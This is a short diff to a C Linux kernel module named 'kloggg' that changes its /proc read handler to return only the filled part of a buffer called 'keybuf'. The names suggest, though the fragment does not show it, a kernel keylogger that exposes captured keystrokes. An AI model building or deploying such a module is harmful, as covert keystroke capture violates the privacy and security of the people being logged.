@@ -20,15 +20,13 @@ static struct proc_dir_entry *kloggg_proc_file;
 
 static ssize_t kloggg_proc_file_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
   ssize_t len;
+  size_t datalen = strnlen(keybuf, KEYBUF_LEN); // or your known data length
 
-  // If we've already read past the buffer, return 0 (EOF)
-  if (*ppos >= KEYBUF_LEN)
+  if (*ppos >= datalen)
     return 0;
 
-    // Limit how much we send to userspace
-  len = min((ssize_t)(KEYBUF_LEN - *ppos), (ssize_t)count);
+  len = min(datalen - *ppos, count);
 
-  // Copy to userspace
   if (copy_to_user(ubuf, keybuf + *ppos, len))
     return -EFAULT;
 
